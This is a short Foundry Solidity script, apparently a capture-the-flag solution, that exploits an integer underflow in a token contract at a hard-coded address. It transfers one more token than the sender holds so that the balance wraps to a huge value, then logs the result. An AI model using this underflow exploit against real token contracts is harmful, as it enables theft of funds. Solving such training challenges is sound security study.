// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IToken {
  function transfer(address to, uint256 value) external;

  function balanceOf(address owner) external view returns (uint256);
}

contract Solve is Script, Test {
  IToken target = IToken(0xFd93780DC7057809CD90ccCd017365531b4BAf6C);

  function run() public {
    vm.startBroadcast();

    uint256 balanceBefore = target.balanceOf(msg.sender);
    target.transfer(address(target), balanceBefore + 1);
    uint256 balanceAfter = target.balanceOf(msg.sender);
    console.log("Balance after is %s", balanceAfter);
    console.log("type(uint256).max is %s", type(uint256).max);

    vm.stopBroadcast();
  }
}
